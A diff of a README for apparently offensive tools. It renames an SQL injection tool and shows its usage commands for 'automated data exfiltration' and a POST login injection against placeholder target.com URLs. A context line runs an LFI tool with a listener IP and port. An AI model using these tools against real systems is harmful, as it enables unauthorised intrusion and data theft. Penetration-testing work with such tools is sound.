@@ -34,16 +34,16 @@ python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
 
 ---
 
-## 🚀 SQLI-FILLER v1.0 Quick Usage
+## 🚀 SD-QLi v1.0 Quick Usage
 
 Fast scan and automated data exfiltration:
 ```bash
-python3 sqlifiller.py -u "http://target.com/products.php?id=1"
+python3 SD-QLi.py -u "http://target.com/products.php?id=1"
 ```
 
 POST-based injection test:
 ```bash
-python3 sqlifiller.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
+python3 SD-QLi.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
 ```
 
 ---
